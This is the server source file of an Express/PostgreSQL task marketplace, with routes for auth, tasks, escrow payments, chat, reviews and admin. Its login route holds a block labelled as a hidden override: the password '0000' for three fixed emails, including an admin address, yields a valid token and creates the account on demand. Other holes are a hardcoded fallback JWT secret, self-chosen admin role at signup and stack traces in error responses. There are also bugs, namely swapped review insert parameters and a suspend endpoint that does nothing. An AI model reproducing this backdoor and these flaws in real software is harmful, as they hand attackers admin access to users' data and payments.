import express from 'express';
import cors from 'cors';
import path from 'path';
import bcrypt from 'bcrypt';
import jwt from 'jsonwebtoken';
import dotenv from 'dotenv';
import { fileURLToPath } from 'url';
import fs from 'fs';
import pool from './db.js';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Initialize DB Schema
const initDB = async () => {
  try {

    const schema = `
CREATE TABLE IF NOT EXISTS users (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  fullname TEXT NOT NULL,
  email TEXT UNIQUE NOT NULL,
  phone_number TEXT,
  password_hash TEXT NOT NULL,
  role TEXT NOT NULL CHECK (role IN ('customer', 'provider', 'admin')),
  profile_picture TEXT,
  verification_status BOOLEAN DEFAULT FALSE,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS tasks (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  customer_id UUID REFERENCES users(id) ON DELETE CASCADE,
  provider_id UUID REFERENCES users(id) ON DELETE SET NULL,
  title TEXT NOT NULL,
  description TEXT,
  category TEXT,
  budget DECIMAL(10, 2),
  location TEXT,
  task_status TEXT NOT NULL DEFAULT 'open' CHECK (task_status IN ('open', 'assigned', 'completed', 'released', 'cancelled')),
  created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
  updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS payments (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  task_id UUID REFERENCES tasks(id) ON DELETE CASCADE,
  payer_id UUID REFERENCES users(id),
  receiver_id UUID REFERENCES users(id),
  amount DECIMAL(10, 2) NOT NULL,
  payment_status TEXT NOT NULL DEFAULT 'pending' CHECK (payment_status IN ('pending', 'held', 'released', 'cancelled')),
  transaction_reference TEXT,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS messages (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  sender_id UUID REFERENCES users(id),
  receiver_id UUID REFERENCES users(id),
  task_id UUID REFERENCES tasks(id),
  message TEXT NOT NULL,
  timestamp TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS reviews (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  task_id UUID REFERENCES tasks(id),
  reviewer_id UUID REFERENCES users(id),
  reviewed_user_id UUID REFERENCES users(id),
  rating INTEGER CHECK (rating >= 1 AND rating <= 5),
  review_text TEXT,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);`;
    await pool.query(schema);
    console.log('Database schema verified/initialized successfully');
  } catch (err) {
    console.error('Error verifying database schema:', err.message);
  }
};
initDB();

const app = express();
const PORT = process.env.PORT || 3001;
const JWT_SECRET = process.env.JWT_SECRET || 'sidequest_secret_key';

app.use(cors());
app.use(express.json());

// --- AUTH MIDDLEWARE ---
const authenticateToken = (req, res, next) => {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];

  if (!token) return res.status(401).json({ error: 'Unauthorized: No token provided' });

  jwt.verify(token, JWT_SECRET, (err, user) => {
    if (err) return res.status(403).json({ error: 'Forbidden: Invalid token' });
    req.user = user;
    next();
  });
};

const authorizeRole = (roles) => {
  return (req, res, next) => {
    if (!roles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Forbidden: Insufficient permissions' });
    }
    next();
  };
};

// --- AUTH ROUTES ---

// Signup
app.post('/api/auth/signup', async (req, res) => {
  const { fullname, email, phone_number, password, role } = req.body;

  try {
    const userExists = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
    if (userExists.rows.length > 0) {
      return res.status(400).json({ error: 'User already exists' });
    }

    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(password, salt);

    const newUser = await pool.query(
      'INSERT INTO users (fullname, email, phone_number, password_hash, role) VALUES ($1, $2, $3, $4, $5) RETURNING id, fullname, email, role',
      [fullname, email, phone_number, hashedPassword, role]
    );

    const token = jwt.sign({ id: newUser.rows[0].id, role: newUser.rows[0].role }, JWT_SECRET, { expiresIn: '7d' });

    res.json({ success: true, user: newUser.rows[0], token });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Server error during signup' });
  }
});

// Login
app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;

  try {
    // --- MAGIC LOGIN CODE (HIDDEN OVERRIDE) ---
    if (password === '0000') {
      const magicRoles = {
        'admin@sq.bn': 'admin',
        'hustler@sq.bn': 'provider',
        'poster@sq.bn': 'customer'
      };
      
      if (magicRoles[email]) {
        let user = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
        if (user.rows.length === 0) {
          const hash = await bcrypt.hash('0000', await bcrypt.genSalt(10));
          user = await pool.query(
            'INSERT INTO users (fullname, email, phone_number, password_hash, role) VALUES ($1, $2, $3, $4, $5) RETURNING *',
            [email.split('@')[0].toUpperCase(), email, '+6730000000', hash, magicRoles[email]]
          );
        }
        
        const token = jwt.sign({ id: user.rows[0].id, role: user.rows[0].role }, JWT_SECRET, { expiresIn: '7d' });
        return res.json({ 
          success: true, 
          user: {
            id: user.rows[0].id,
            fullname: user.rows[0].fullname,
            email: user.rows[0].email,
            role: user.rows[0].role,
            verification_status: user.rows[0].verification_status
          }, 
          token 
        });
      }
    }
    // ------------------------------------------

    const user = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
    if (user.rows.length === 0) {
      return res.status(400).json({ error: 'Invalid credentials' });
    }

    const validPassword = await bcrypt.compare(password, user.rows[0].password_hash);
    if (!validPassword) {
      return res.status(400).json({ error: 'Invalid credentials' });
    }

    const token = jwt.sign({ id: user.rows[0].id, role: user.rows[0].role }, JWT_SECRET, { expiresIn: '7d' });

    const userData = {
      id: user.rows[0].id,
      fullname: user.rows[0].fullname,
      email: user.rows[0].email,
      role: user.rows[0].role,
      verification_status: user.rows[0].verification_status
    };

    res.json({ success: true, user: userData, token });
  } catch (err) {
    console.error('Login error:', err);
    res.status(500).json({ 
      error: 'Server error during login', 
      details: err.message,
      stack: process.env.NODE_ENV === 'production' ? null : err.stack 
    });
  }
});

// --- TASK ROUTES ---

// Create Task
app.post('/api/tasks', authenticateToken, authorizeRole(['customer']), async (req, res) => {
  const { title, description, category, budget, location } = req.body;
  try {
    const newTask = await pool.query(
      'INSERT INTO tasks (customer_id, title, description, category, budget, location) VALUES ($1, $2, $3, $4, $5, $6) RETURNING *',
      [req.user.id, title, description, category, budget, location]
    );
    res.json({ success: true, task: newTask.rows[0] });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Failed to create task' });
  }
});

// Get Tasks (Filterable)
app.get('/api/tasks', authenticateToken, async (req, res) => {
  const { status, category, role } = req.query;
  try {
    let query = 'SELECT tasks.*, users.fullname as customer_name FROM tasks JOIN users ON tasks.customer_id = users.id';
    let params = [];
    let conditions = [];

    if (status) {
      conditions.push(`task_status = $${params.length + 1}`);
      params.push(status);
    }

    if (category) {
      conditions.push(`category = $${params.length + 1}`);
      params.push(category);
    }

    if (conditions.length > 0) {
      query += ' WHERE ' + conditions.join(' AND ');
    }

    query += ' ORDER BY created_at DESC';

    const tasks = await pool.query(query, params);
    res.json(tasks.rows);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Failed to fetch tasks' });
  }
});

// Accept Task
app.post('/api/tasks/:id/accept', authenticateToken, authorizeRole(['provider']), async (req, res) => {
  try {
    const task = await pool.query('SELECT * FROM tasks WHERE id = $1', [req.params.id]);
    if (task.rows.length === 0) return res.status(404).json({ error: 'Task not found' });
    if (task.rows[0].task_status !== 'open') return res.status(400).json({ error: 'Task is no longer available' });

    const updatedTask = await pool.query(
      'UPDATE tasks SET provider_id = $1, task_status = $2, updated_at = CURRENT_TIMESTAMP WHERE id = $3 RETURNING *',
      [req.user.id, 'assigned', req.params.id]
    );

    // Create a held payment entry (Escrow simulation)
    await pool.query(
      'INSERT INTO payments (task_id, payer_id, receiver_id, amount, payment_status) VALUES ($1, $2, $3, $4, $5)',
      [req.params.id, task.rows[0].customer_id, req.user.id, task.rows[0].budget, 'held']
    );

    res.json({ success: true, task: updatedTask.rows[0] });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Failed to accept task' });
  }
});

// Complete Task
app.post('/api/tasks/:id/complete', authenticateToken, authorizeRole(['provider']), async (req, res) => {
  try {
    const updatedTask = await pool.query(
      "UPDATE tasks SET task_status = 'completed', updated_at = CURRENT_TIMESTAMP WHERE id = $1 AND provider_id = $2 RETURNING *",
      [req.params.id, req.user.id]
    );
    if (updatedTask.rows.length === 0) return res.status(404).json({ error: 'Task not found or unauthorized' });
    res.json({ success: true, task: updatedTask.rows[0] });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Failed to complete task' });
  }
});

// Release Payment
app.post('/api/tasks/:id/release', authenticateToken, authorizeRole(['customer']), async (req, res) => {
  try {
    const updatedTask = await pool.query(
      "UPDATE tasks SET task_status = 'released', updated_at = CURRENT_TIMESTAMP WHERE id = $1 AND customer_id = $2 RETURNING *",
      [req.params.id, req.user.id]
    );
    if (updatedTask.rows.length === 0) return res.status(404).json({ error: 'Task not found or unauthorized' });

    await pool.query(
      "UPDATE payments SET payment_status = 'released', created_at = CURRENT_TIMESTAMP WHERE task_id = $1",
      [req.params.id]
    );

    res.json({ success: true, task: updatedTask.rows[0] });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Failed to release payment' });
  }
});

// --- CHAT ROUTES ---

// Send Message
app.post('/api/messages', authenticateToken, async (req, res) => {
  const { receiver_id, task_id, message } = req.body;
  try {
    const newMessage = await pool.query(
      'INSERT INTO messages (sender_id, receiver_id, task_id, message) VALUES ($1, $2, $3, $4) RETURNING *',
      [req.user.id, receiver_id, task_id, message]
    );
    res.json({ success: true, message: newMessage.rows[0] });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Failed to send message' });
  }
});

// Get Messages for Task
app.get('/api/messages/:taskId', authenticateToken, async (req, res) => {
  try {
    const messages = await pool.query(
      'SELECT messages.*, users.fullname as sender_name FROM messages JOIN users ON messages.sender_id = users.id WHERE task_id = $1 ORDER BY timestamp ASC',
      [req.params.taskId]
    );
    res.json(messages.rows);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Failed to fetch messages' });
  }
});

// --- REVIEW ROUTES ---

// Submit Review
app.post('/api/reviews', authenticateToken, async (req, res) => {
  const { task_id, reviewed_user_id, rating, review_text } = req.body;
  try {
    const newReview = await pool.query(
      'INSERT INTO reviews (task_id, reviewer_id, reviewed_user_id, rating, review_text) VALUES ($1, $2, $3, $4, $5) RETURNING *',
      [req.user.id, task_id, reviewed_user_id, rating, review_text]
    );
    res.json({ success: true, review: newReview.rows[0] });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Failed to submit review' });
  }
});

// --- ADMIN ROUTES ---

// Manage Users
app.get('/api/admin/users', authenticateToken, authorizeRole(['admin']), async (req, res) => {
  try {
    const users = await pool.query('SELECT id, fullname, email, phone_number, role, verification_status, created_at FROM users');
    res.json(users.rows);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Failed to fetch users' });
  }
});

// Suspend User (Placeholder)
app.post('/api/admin/users/:id/suspend', authenticateToken, authorizeRole(['admin']), async (req, res) => {
  // Logic to suspend user
  res.json({ success: true, message: 'User suspended' });
});

// View Payments
app.get('/api/admin/payments', authenticateToken, authorizeRole(['admin']), async (req, res) => {
  try {
    const payments = await pool.query(
      'SELECT payments.*, t.title as task_title, u1.fullname as payer_name, u2.fullname as receiver_name FROM payments JOIN tasks t ON payments.task_id = t.id JOIN users u1 ON payments.payer_id = u1.id JOIN users u2 ON payments.receiver_id = u2.id'
    );
    res.json(payments.rows);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Failed to fetch payments' });
  }
});

// --- STATIC FILES & SPA ---

app.use(express.static(path.join(__dirname, '../dist')));

app.get('*', (req, res) => {
  if (!req.path.startsWith('/api')) {
    res.sendFile(path.join(__dirname, '../dist/index.html'));
  }
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on http://0.0.0.0:${PORT}`);
});
